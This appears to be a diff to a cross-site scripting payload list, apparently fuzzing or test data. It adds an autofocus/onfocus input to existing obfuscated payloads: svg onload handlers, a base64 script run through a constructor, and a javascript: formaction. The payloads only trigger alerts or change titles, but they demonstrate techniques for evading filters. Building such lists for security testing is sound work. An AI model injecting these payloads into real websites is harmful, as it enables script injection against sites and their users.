@@ -3,3 +3,4 @@ ZKB"></iframe><svg/onload%3Dtop%5B%27docu%27%2B%27ment%27%5D.title%3D%27TVC6-TIT
 %23red<%2Fstyle><svg%20onload%3Dtop%5B%27docu%27%2B%27ment%27%5D.title%3D%27PWNED-TITLE%27%3Btop.name%3D%27ALERT-XSS%27%3Btop.onerror%3Dtop%5B%27%26%2397%3Blert%27%5D%3Btop.undefvar.x>
 <script>[]["filter"]["constructor"](atob("YWxlcnQoMSk="))()</script>
 <form id=x><button form=x formaction=javascript:alert(1)>Click
+<input autofocus tabindex=1 onfocus=top[/al/.source+/ert/.source](1)>
